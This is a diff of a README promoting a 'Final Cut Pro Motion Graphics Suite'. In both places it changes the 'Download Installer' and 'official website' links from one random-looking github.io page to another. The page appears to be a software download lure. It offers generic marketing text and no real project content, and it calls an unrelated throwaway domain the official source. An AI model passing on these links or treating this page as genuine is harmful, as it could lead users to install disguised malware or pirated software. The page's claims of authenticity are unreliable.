@@ -2,7 +2,7 @@
 
 This comprehensive suite for Final Cut Pro offers an array of professional-grade plugins, templates, and motion graphics to transform your video editing workflow. Designed for creators who demand quality, it includes tools for color grading, visual effects, and more, ensuring compatibility with the latest 2026 updates. Whether you're working on YouTube videos or cinematic projects, this suite provides everything you need to achieve stunning results with ease.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -52,6 +52,6 @@ A4: No, the plugins and templates are specifically designed for Final Cut Pro an
 
 To download the Final Cut Pro Motion Graphics Suite, please visit the official download page:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 This will provide you with the latest version of the installer. We recommend always using the official source to ensure authenticity and security. Thank you for choosing our suite to enhance your video editing projects!
